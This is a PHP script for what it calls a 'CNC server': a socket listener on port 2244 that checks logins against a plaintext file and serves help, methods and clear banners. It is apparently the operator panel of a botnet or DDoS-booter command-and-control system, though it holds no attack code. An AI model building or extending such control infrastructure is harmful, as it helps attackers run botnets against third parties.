<?php
// Define the path to the logins file
$loginsFile = "logins.txt";

// Load the logins from the file into an associative array
$logins = array();
$handle = fopen($loginsFile, "r");
if ($handle) {
  while (($line = fgets($handle)) !== false) {
    $parts = explode(" ", trim($line));
    if (count($parts) == 2) {
      $logins[$parts[0]] = $parts[1];
    }
  }
  fclose($handle);
}

// Define the port number to listen on
$port = 2244;

// Create the server socket and start listening for incoming connections
$socket = socket_create(AF_INET, SOCK_STREAM, 0);
if (!socket_bind($socket, "0.0.0.0", $port)) {
  die("Unable to bind to port $port");
}
if (!socket_listen($socket)) {
  die("Unable to start listening on port $port");
}
echo "CNC server started on port $port\n";

// Loop indefinitely, accepting new connections and handling them
while (true) {
  // Accept a new connection
  $clientSocket = socket_accept($socket);
  if (!$clientSocket) {
    continue;
  }

  // Prompt the user to log in with a username and password
  socket_write($clientSocket, "Please Login.\nUsername: ");
  $username = trim(socket_read($clientSocket, 1024, PHP_NORMAL_READ));
  socket_write($clientSocket, "Password: ");
  $password = trim(socket_read($clientSocket, 1024, PHP_NORMAL_READ));

  // Check if the username and password are valid
  if (isset($logins[$username]) && $logins[$username] == $password) {
    // Log in successful, execute commands
    socket_write($clientSocket, "Login successful, enter a command or type 'exit' to quit\n");

    while (true) {
      // Read the user's command
      socket_write($clientSocket, "$username@php > ");
      $command = trim(socket_read($clientSocket, 1024, PHP_NORMAL_READ));

      // Handle the command
      if ($command == "exit") {
        // Exit the loop and close the connection
        socket_write($clientSocket, "Goodbye!\n");
        break;
      } else if ($command == "cls") {
        // Clear the screen
        socket_write($clientSocket, chr(27) . "[2J" . chr(27) . "[H");
      } else if ($command == "help") {
        // Display the file
        $helpFile = "banners/help.txt";
        if (file_exists($helpFile)) {
          $helpText = file_get_contents($helpFile);
          socket_write($clientSocket, $helpText);
        } else {
          socket_write($clientSocket, "Error: Help file not found\n");
        }
    } else if ($command == "methods") {
        // Display the file
        $methodsFile = "banners/methods.txt";
        if (file_exists($methodsFile)) {
          $methodsText = file_get_contents($methodsFile);
          socket_write($clientSocket, $methodsText);
        } else {
          socket_write($clientSocket, "Error: Methods file not found\n");
        } 
    } else if ($command == "clear") {
        socket_write($clientSocket, chr(27) . "[2J" . chr(27) . "[H");
        // Display the file
        $clearFile = "banners/clear.txt";
        if (file_exists($clearFile)) {
          $clearText = file_get_contents($clearFile);
          socket_write($clientSocket, $clearText);
        } else {
          socket_write($clientSocket, "Error: clear file not found\n");
        }
      }
    }
  } else {
    // Invalid username or password, close the connection
    socket_write($clientSocket, "Invalid username or password, closing connection\n");
    socket_close($clientSocket);
  }
}
